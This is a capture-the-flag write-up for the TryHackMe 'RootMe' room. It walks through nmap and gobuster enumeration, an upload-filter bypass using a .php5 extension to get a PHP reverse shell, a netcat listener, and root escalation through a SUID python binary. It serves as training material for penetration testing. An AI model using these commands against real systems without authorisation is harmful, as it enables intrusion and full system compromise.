# RootMe Writeup (TryHackMe)

## Enumeration

Scanned the target using:

```bash
sudo nmap <target> -sS -T4 -A -oN init_scan
```

![2025-05-07_12-07](https://github.com/user-attachments/assets/3b8590c3-3019-4e72-bc2a-8d6d20ba7774)

Open ports: `22`, `80`

## Web Enumeration

Used Gobuster to look for hidden directories:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
```

![2025-05-07_12-12](https://github.com/user-attachments/assets/b2f7b77d-86ab-4e40-be99-1cc47f85e780)

Found `/uploads` and `/panel`.

## File Upload Exploit

The `/panel` directory allowed uploading files, accessible later via `/uploads`.

![2025-05-07_12-14_1](https://github.com/user-attachments/assets/cbcdef1f-4988-45d3-8263-a85ec343143e)
![2025-05-07_12-14](https://github.com/user-attachments/assets/1d9c409e-424e-438a-a575-7afc3eeb6569)

Tried uploading a PHP reverse shell. It rejected `.php`, `.php.gif`, and `.php.jpg` due to image validation errors.

![2025-05-07_12-21](https://github.com/user-attachments/assets/f10ee265-453d-4bba-9116-ea6f09be5b42)
![2025-05-07_12-50](https://github.com/user-attachments/assets/f6fbbfc3-1821-4635-aad6-9ee591a1ca4c)

Found `.php5` as a bypass method, and it worked. Uploaded the reverse shell as `.php5`, gained reverse shell.

![2025-05-07_13-00](https://github.com/user-attachments/assets/ced59dd5-b435-4f60-b81e-6e1b88068689)
![2025-05-07_12-58](https://github.com/user-attachments/assets/18b90b5b-bfd3-44b3-a35a-8a39d19a4f3f)

Set up Netcat listener:

```bash
nc -lvnp 7777
```

![2025-05-07_13-01](https://github.com/user-attachments/assets/2dc89d7d-4752-44e6-a17f-aaec10a2ca6f)

Upgraded shell using Python:

```bash
which python
which python3
python -c 'import pty; pty.spawn("/bin/bash")'
```

![2025-05-07_13-03](https://github.com/user-attachments/assets/98a656b6-e3a2-4602-a1a8-b5c90bdf84bb)

## User Flag

Located the user flag:

```bash
find / -type f -name user.txt 2>/dev/null
```

![2025-05-07_13-09](https://github.com/user-attachments/assets/2360d452-ca6f-4f08-9713-05fed3668721)

Found at: `/var/www/user.txt`

## Privilege Escalation

Searched for SUID binaries:

```bash
find / -type f -perm -04000 2>/dev/null
```

![2025-05-07_13-12](https://github.com/user-attachments/assets/16c9ae50-fcdb-4204-bb81-f6f3e6da1cba)

Found `/usr/bin/python` with SUID set.

Used GTFOBins trick:

![2025-05-07_13-13](https://github.com/user-attachments/assets/74f94857-4ef3-4925-be3d-f2accd3ab6b7)

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![2025-05-07_13-14](https://github.com/user-attachments/assets/64f56252-548d-467c-b596-8ce1a922af1a)

Got root shell.

Located the root flag:

```bash
find / -type f -name root.txt 2>/dev/null
```

![2025-05-07_13-15](https://github.com/user-attachments/assets/b3cfa837-37fe-4be0-b26d-12d610b6088f)

Found at: `/root/root.txt`

## Conclusion

![2025-05-07_13-15_1](https://github.com/user-attachments/assets/9cdf2f15-332a-4895-84ae-3b1b44b24085)

This challenge covered file upload vulnerabilities, reverse shell techniques, and classic SUID exploitation.

* Found hidden directories with Gobuster
* Bypassed file upload restrictions with `.php5`
* Used Python SUID binary for root escalation

A solid exercise in understanding how insecure file upload mechanisms and misconfigured SUID binaries can be leveraged for full system compromise.
